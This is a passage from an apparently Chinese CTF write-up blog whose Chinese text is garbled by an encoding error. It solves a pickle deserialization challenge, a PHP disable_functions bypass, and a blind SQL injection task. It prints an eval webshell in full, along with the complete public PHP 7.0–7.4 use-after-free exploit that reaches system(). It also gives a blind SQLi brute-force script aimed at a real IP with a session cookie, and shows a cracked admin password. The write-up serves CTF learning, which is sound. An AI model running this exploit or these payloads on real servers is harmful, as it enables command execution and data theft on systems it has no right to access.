class="string">'Y19fbWFpbl9fCnNlY3JldApwMAooZHAxClMnY2F0ZWdvcnknCnAyClMnZ2diMG4nCnAzCnNTJ25hbWUnCnA0ClMnZ2diMG4nCnA1CnNiLg=='</span></span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨æœ¬åœ°ç”Ÿæˆä¸ªAnimalå¯¹è±¡ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, category)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.category = category        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Animal"</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__eq__</span><span class="params">(self, other)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> type(other) <span class="keyword">is</span> Animal <span class="keyword">and</span> self.name == other.name <span class="keyword">and</span> self.category == other.category</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    a = Animal(<span class="string">'ggb0n'</span>,<span class="string">'ggb0n'</span>)</span><br><span class="line">    print(base64.b64encode(pickle.dumps(a)))</span><br></pre></td></tr></table></figure><p>ç°å°†ç¬¬ä¸€ä¸ªpayloadçš„base64é€šè¿‡è¾“å…¥æ¡†æäº¤ååºåˆ—åŒ–æ‰§è¡Œè¦†ç›–å­—å…¸ï¼Œç„¶åå†æäº¤æˆ‘ä»¬æ„é€ çš„Animalå¯¹è±¡çš„base64ï¼Œå³å¯æ‹¿åˆ°flagï¼š<br><img src="http://www.ggb0n.cool/images/gxctf06.png" alt=""></p><p>å‚è€ƒæ–‡ç« ï¼š<br><a href="https://www.anquanke.com/post/id/188981#h3-8">https://www.anquanke.com/post/id/188981#h3-8</a><br><a href="http://blog.nsfocus.net/%e7%bb%95%e8%bf%87-restrictedunpickler/">http://blog.nsfocus.net/%e7%bb%95%e8%bf%87-restrictedunpickler/</a></p><h2 id="PHP-UAF"><a href="#PHP-UAF" class="headerlink" title="PHP-UAF"></a><strong>PHP-UAF</strong></h2><p>è€ƒå¯Ÿ<code>functions_disable</code>çš„ç»•è¿‡ï¼Œä¸Šæ¬¡Iæ˜¥ç§‹å…¬ç›Šèµ›<code>easy_thinking</code>åˆšé‡åˆ°çš„çŸ¥è¯†ç‚¹ï¼Œå‰ä¸¤å¤©åœ¨CTFHubä¸Šä¹Ÿåœ¨åˆ·è¿™æ–¹é¢çš„é¢˜ã€‚</p><h3 id="é¢˜ç›®åˆ†æ-2"><a href="#é¢˜ç›®åˆ†æ-2" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿›å…¥é¢˜ç›®ç›´æ¥ç»™äº†å°é©¬ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$sandbox = <span class="string">'/var/www/html/sandbox/'</span> . md5(<span class="string">"wdwd"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'cmd'</span>])) &#123;</span><br><span class="line">    @<span class="keyword">eval</span>($_REQUEST[<span class="string">'cmd'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>å…ˆçœ‹ä¸€ä¸‹<code>phpinfo</code>ï¼š<br><img src="http://www.ggb0n.cool/images/gxctf10.png" alt=""></p><p>æ˜¯PHP 7ç‰ˆæœ¬çš„ï¼Œæœ‰ä¸€ä¸ªbypassä»£ç å¯ä»¥ç”¨ï¼Œåœ¨<a href="https://www.exploit-db.com/exploits/48072">è¿™é‡Œ</a>ã€‚</p><p>ç„¶åçœ‹ä¸€ä¸‹<code>functions_disable</code>æœç„¶banæ‰äº†å¾ˆå¤šå‡½æ•°ï¼š<br><img src="http://www.ggb0n.cool/images/gxctf11.png" alt=""></p><p>é‚£ä¹ˆæ€è·¯å°±æœ‰äº†ï¼š</p><ul><li>1ã€èšå‰‘è¿æ¥ï¼Œä¸Šä¼ bypassè„šæœ¬</li><li>2ã€æµè§ˆå™¨è®¿é—®ï¼Œè·å–shell</li></ul><h3 id="è§£é¢˜-2"><a href="#è§£é¢˜-2" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>å°†å¦‚ä¸‹çš„bypassè„šæœ¬ä¸Šä¼ ï¼ˆä¸Šæ¬¡çš„bypassè„šæœ¬ç”¨ä¸äº†â€¦ï¼‰ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP 7.0-7.4 disable_functions bypass PoC (*nix only)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># <span class="doctag">Bug:</span> https://bugs.php.net/bug.php?id=76047</span></span><br><span class="line"><span class="comment"># debug_backtrace() returns a reference to a variable </span></span><br><span class="line"><span class="comment"># that has been destroyed, causing a UAF vulnerability.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This exploit should work on all PHP 7.0-7.4 versions</span></span><br><span class="line"><span class="comment"># released as of 30/01/2020.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line">pwn(<span class="string">"uname -a"</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span><span class="params">($cmd)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $abc, $helper, $backtrace;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> $backtrace; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">            $backtrace = (<span class="keyword">new</span> <span class="keyword">Exception</span>)-&gt;getTrace(); <span class="comment"># ;)</span></span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>($backtrace[<span class="number">1</span>][<span class="string">'args'</span>])) &#123; <span class="comment"># PHP &gt;= 7.4</span></span><br><span class="line">                $backtrace = debug_backtrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span><span class="params">(&amp;$str, $p = <span class="number">0</span>, $s = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $address = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($j = $s<span class="number">-1</span>; $j &gt;= <span class="number">0</span>; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span><span class="params">($ptr, $m = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $out = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= chr($ptr &amp; <span class="number">0xff</span>);</span><br><span class="line">            $ptr &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">(&amp;$str, $p, $v, $n = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] = chr($v &amp; <span class="number">0xff</span>);</span><br><span class="line">            $v &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span><span class="params">($addr, $p = <span class="number">0</span>, $s = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $abc, $helper;</span><br><span class="line">        write($abc, <span class="number">0x68</span>, $addr + $p - <span class="number">0x10</span>);</span><br><span class="line">        $leak = strlen($helper-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>($s != <span class="number">8</span>) &#123; $leak %= <span class="number">2</span> &lt;&lt; ($s * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span><span class="params">($base)</span> </span>&#123;</span><br><span class="line">        $e_type = leak($base, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        $e_phoff = leak($base, <span class="number">0x20</span>);</span><br><span class="line">        $e_phentsize = leak($base, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        $e_phnum = leak($base, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            $p_flags = leak($header, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            $p_vaddr = leak($header, <span class="number">0x10</span>);</span><br><span class="line">            $p_memsz = leak($header, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                $data_addr = $e_type == <span class="number">2</span> ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span><span class="params">($base, $elf)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $data_size / <span class="number">8</span>; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># 'constant' constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            $leak = leak($data_addr, ($i + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># 'bin2hex' constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $data_addr + $i * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span><span class="params">($binary_leak)</span> </span>&#123;</span><br><span class="line">        $base = <span class="number">0</span>;</span><br><span class="line">        $start = $binary_leak &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x1000</span>; $i++) &#123;</span><br><span class="line">            $addr = $start - <span class="number">0x1000</span> * $i;</span><br><span class="line">            $leak = leak($addr, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span><span class="params">($basic_funcs)</span> </span>&#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($f_name == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> leak($addr + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>($f_entry != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span><span class="params">($arg)</span> </span>&#123;</span><br><span class="line">        <span class="comment"># str_shuffle prevents opcache string interning</span></span><br><span class="line">        $arg = str_shuffle(str_repeat(<span class="string">'A'</span>, <span class="number">79</span>));</span><br><span class="line">        $vuln = <span class="keyword">new</span> Vuln();</span><br><span class="line">        $vuln-&gt;a = $arg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">'WIN'</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'This PoC is for *nix systems only.'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n_alloc = <span class="number">10</span>; <span class="comment"># increase this value if UAF fails</span></span><br><span class="line">    $contiguous = [];</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_shuffle(str_repeat(<span class="string">'A'</span>, <span class="number">79</span>));</span><br><span class="line"></span><br><span class="line">    trigger_uaf(<span class="string">'x'</span>);</span><br><span class="line">    $abc = $backtrace[<span class="number">1</span>][<span class="string">'args'</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    $helper = <span class="keyword">new</span> Helper;</span><br><span class="line">    $helper-&gt;b = <span class="function"><span class="keyword">function</span> <span class="params">($x)</span> </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen($abc) == <span class="number">79</span> || strlen($abc) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"UAF failed"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    $closure_handlers = str2ptr($abc, <span class="number">0</span>);</span><br><span class="line">    $php_heap = str2ptr($abc, <span class="number">0x58</span>);</span><br><span class="line">    $abc_addr = $php_heap - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    write($abc, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write($abc, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    write($abc, <span class="number">0x10</span>, $abc_addr + <span class="number">0x60</span>);</span><br><span class="line">    write($abc, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    $closure_obj = str2ptr($abc, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    $binary_leak = leak($closure_handlers, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't determine binary base address"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't parse ELF header"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't get basic_functions address"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't get zif_system address"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    $fake_obj_offset = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x110</span>; $i += <span class="number">8</span>) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    write($abc, <span class="number">0x20</span>, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x68</span>, $zif_system); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯webç›®å½•æ²¡æœ‰ä¸Šä¼ æƒé™â€¦è¿™æ—¶å€™å‘ç°webç›®å½•ä¸‹å­˜åœ¨<code>sandbox</code>æ–‡ä»¶å¤¹ï¼Œè¿™é‡Œå¯ä»¥ä¸Šä¼ ï¼Œniceï¼<br><img src="http://www.ggb0n.cool/images/gxctf12.png" alt=""></p><p>ç„¶ååˆ°æµè§ˆå™¨è®¿é—®<code>/sandbox/bypass7x.php</code>ï¼Œä½†æ˜¯ä¸€ç›´ä¸èƒ½è®¿é—®â€¦</p><p>ä½†æ˜¯æˆ‘ä»¬æœ‰å°é©¬å‘¢ï¼Œç”¨å°é©¬åŒ…å«ä¸€ä¸‹è¯•è¯•</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">cmd</span><span class="bash">=include(<span class="string">"sandbox/bypass7x.php"</span>);</span></span><br></pre></td></tr></table></figure><p>å‘ç°æˆåŠŸæ‰§è¡Œï¼š<br><img src="http://www.ggb0n.cool/images/gxctf08.png" alt=""></p><p>ç„¶åæˆ‘ä»¬é‚£æ‰§è¡Œçš„å‘½ä»¤æ”¹ä¸º<code>/readflag</code>ï¼Œå³å¯æ‹¿åˆ°flagï¼š<br><img src="http://www.ggb0n.cool/images/gxctf09.png" alt=""></p><p>è¿™é¢˜çš„æœ€åä¸å¾—ä¸è¯´â€¦æ…å±çœŸçˆ½ï¼Œä¸è¿‡æœ‰ç‚¹å¯è€»ã€‚</p><h1 id="DAY-2"><a href="#DAY-2" class="headerlink" title="DAY 2"></a>DAY 2</h1><p>å‰©ä¸‹çš„é¢˜ç›®éƒ½æ˜¯é«˜éš¾åº¦äº†ï¼Œå°±å‡ºäº†åŠä¸ªé¢˜â€¦</p><h2 id="nweb"><a href="#nweb" class="headerlink" title="nweb"></a>nweb</h2><p>è€ƒå¯Ÿsqlç›²æ³¨+ä¼ªé€ mysql-serverå®ç°ä»»æ„æ–‡ä»¶è¯»å–ï¼Œè¿™æ¬¡æ˜¯çœŸå¿ƒä½“ä¼šåˆ°ï¼Œä»¥åç›²æ³¨è„šæœ¬è¿˜æ˜¯ç”¨asciiç å§ï¼Œåšå†³ä¸ç”¨å­—æ¯è¡¨äº†â€¦</p><h4 id="é¢˜ç›®åˆ†æ-3"><a href="#é¢˜ç›®åˆ†æ-3" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h4><p>è¿›å…¥é¢˜ç›®ï¼Œå‘ç°å¯ä»¥æ³¨å†Œç™»å½•ï¼Œç™»é™†ä¸Šä¹‹åflagé¡µé¢è®¿é—®æ— æƒé™ï¼Œåœ¨è¯„è®ºåŒºçœ‹åˆ°äº†å¦‚ä¸‹çš„æç¤ºï¼š<br><img src="http://www.ggb0n.cool/images/gxctf15.png" alt=""></p><p>çŒœæµ‹æ³¨å†Œè´¦æˆ·çš„æ—¶å€™å¯èƒ½å­˜åœ¨é—®é¢˜ï¼Œé‡æ–°æ³¨å†Œï¼ŒæŠ“åŒ…å‘ç°å­˜åœ¨<code>type</code>å‚æ•°ï¼Œå¹¶ä¸”è¢«ç½®ä¸º<code>0</code>ï¼š<br><img src="http://www.ggb0n.cool/images/gxctf18.png" alt=""></p><p>é‚£è¿™ä¸ªå‚æ•°åº”è¯¥å°±æ˜¯ä¸ç­‰çº§æœ‰å…³äº†ï¼Œåæ¥åœ¨æ³¨å†Œé¡µé¢çœ‹åˆ°æç¤ºï¼š<br><img src="http://www.ggb0n.cool/images/gxctf16.png" alt=""></p><p>å†æ¬¡æŠ“åŒ…æ›´æ”¹<code>type=110</code>ï¼Œç™»å½•å†æ¬¡è®¿é—®flagé¡µï¼Œå‘ç°å¯ä»¥æœç´¢flagäº†ï¼š<br><img src="http://www.ggb0n.cool/images/gxctf17.png" alt=""></p><p>æœç´¢çš„é¡µé¢æ˜¯<code>search.php</code>ï¼Œæ³¨å…¥ç‚¹è‚¯å®šå°±æ˜¯åœ¨è¿™ä¸ªé¡µé¢äº†ï¼Œå‚æ•°æ˜¯<code>flag</code>ï¼Œç»è¿‡FUZZå‘ç°ï¼Œ<code>union</code>è¢«banï¼Œ<code>select</code>ã€<code>from</code>éœ€è¦åŒå†™ç»•è¿‡ï¼ŒæŸ¥çœ‹æœç´¢çš„å›æ˜¾å‘ç°ï¼Œè¯­å¥é”™è¯¯åé¦ˆ<code>There is no flag</code>ï¼Œè¯­å¥æ­£ç¡®åé¦ˆ<code>There is flag!</code>è‚¯å®šæ˜¯ç›²æ³¨äº†ï¼Œæ‹¿ä¸Šæ¬¡Iæ˜¥ç§‹æˆ˜â€œç–«â€èµ›çš„ç›²æ³¨è„šæœ¬æ”¹äº†ä¸€ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://121.37.179.47:1001/search.php'</span></span><br><span class="line">headers = &#123;<span class="string">"Cookie"</span>: <span class="string">"PHPSESSID=b2olm04l72i9v25s1orvb28253; username=8837cc3dd80b62a3b5bab3ff2dc91469"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = "-1' or (ascii(mid((selselectect database()),&#123;0&#125;,1))=&#123;1&#125;)#"</span></span><br><span class="line"><span class="comment">#payload = "-1' or (ascii(mid((selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database()),&#123;0&#125;,1))=&#123;1&#125;)#"</span></span><br><span class="line"><span class="comment">#payload = "-1' or (ascii(mid((selselectect group_concat(column_name) frfromom information_schema.columns where table_name='admin'),&#123;0&#125;ï¼Œ1))=&#123;1&#125;)#"</span></span><br><span class="line">payload = <span class="string">"-1' or (ascii(mid((selselectect * frfromom fl4g),&#123;0&#125;,1))=&#123;1&#125;)#"</span></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">80</span>):</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">30</span>,<span class="number">127</span>):<span class="comment">#æ³¨æ„è¿™é‡Œæœ‰æ—¶å€™å¯¼è‡´æ•ˆç‡å¾ˆä½</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"flag"</span>: payload.format(i, n),</span><br><span class="line">        &#125;</span><br><span class="line">        req = requests.post(url, data=data,headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"There is flag"</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            database += chr(n)</span><br><span class="line">            print(database)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><blockquote><p>mysqlä¸åŒºåˆ†å¤§å°å†™ï¼Œå°±æ˜¯è¯´å¦‚æœaä¸å­˜åœ¨ï¼Œä¼šç”¨Aå»åŒ¹é…aâ€¦å†™ç›²æ³¨è„šæœ¬ï¼Œå¦‚æœç”¨å­—æ¯è¡¨çš„è¯ï¼Œè¿™å°±æ˜¯ä¸ªå·¨å‘ï¼è¿˜æ˜¯ç”¨asciiç é è°±ï¼Œä¸è¿‡asciiä¼šåŒ¹é…è¾ƒå¤šçš„å­—ç¬¦ï¼Œçˆ†ç ´é€Ÿåº¦æœ‰æ—¶å€™ä¼šå¾ˆæ…¢ï¼Œå¯èƒ½å› ä¸ºå¾ˆå¤šå­—ç¬¦è¯·æ±‚è®©æœåŠ¡å™¨500å¯¼è‡´çš„â€¦è¿™ä¸€ç‚¹è·‘è„šæœ¬çš„æ—¶å€™æ”¹äº†åŠå¤©â€¦è¿˜æ˜¯tcl</p></blockquote><p>è·‘å‡ºåº“åï¼š<code>ctf-2</code><br>è¡¨åï¼š<code>admin</code>ã€<code>fl4g</code>ã€<code>jd</code>ã€<code>user</code><br>ç›´æ¥åˆ°<code>fl4g</code>è¡¨è·‘flagï¼Œè·‘äº†å‡ æ¬¡éƒ½æ²¡æœ‰è·‘å‡ºå®Œæ•´çš„flagï¼š<br><img src="http://www.ggb0n.cool/images/gxctf19.png" alt=""></p><p>åæ¥ç»é˜Ÿå‹æç¤ºï¼Œflagå¯èƒ½æ˜¯åˆ†å¼€å­˜æ”¾çš„ï¼Œæ•°æ®åº“å¯èƒ½åªæœ‰éƒ¨åˆ†flagã€‚äºæ˜¯æƒ³åˆ°è¿˜æœ‰<code>admin</code>è¡¨å¯ä»¥å»æŸ¥ç®¡ç†å‘˜å¯†ç ï¼Œç”¨è„šæœ¬è·‘å‡ºå¯†ç <code>e2ecea8b80a96fb07f43a2f83c8b0960</code>ï¼Œmd5è§£å¯†ä¸€ä¸‹å¾—åˆ°<code>whoamiadmin</code>ï¼Œæ‹¿å»ç”¨<code>admin/whoamiadmin</code>ç™»å½•å´è¯´ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯â€¦åŠå¤©éƒ½ä¸è¡Œâ€¦ç¡äº†ç¡äº†</p><p>DAY3é†’æ¥å‘ç°flagå·²ç»è¢«é˜Ÿå‹äº¤äº†ï¼Œå¯†ç å°±æ˜¯é‚£ä¸ªï¼Œåº”è¯¥æ˜¯ç¯å¢ƒå‡ºé—®é¢˜äº†â€¦é‚£ä¹ˆå†æ¥å­¦ä¹ ä¸€ä¸‹ã€‚</p><p>ç®¡ç†å‘˜ç™»å½•ä¹‹åï¼š<br><img src="http://www.ggb0n.cool/images/gxctf20.png" alt=""></p><p>æ ¹æ®å‰åŠéƒ¨åˆ†flagï¼Œæƒ³åˆ°æ˜¯<code>mysqlèœœç½ä»»æ„è¯»å–æ–‡ä»¶</code>å‚è€ƒ<a href="https://www.jianshu.com/p/b97080cd7623">è¿™é‡Œ</a>ï¼Œå‚è€ƒgithubä¸Šå¤§å¸ˆå‚…å†™çš„<a 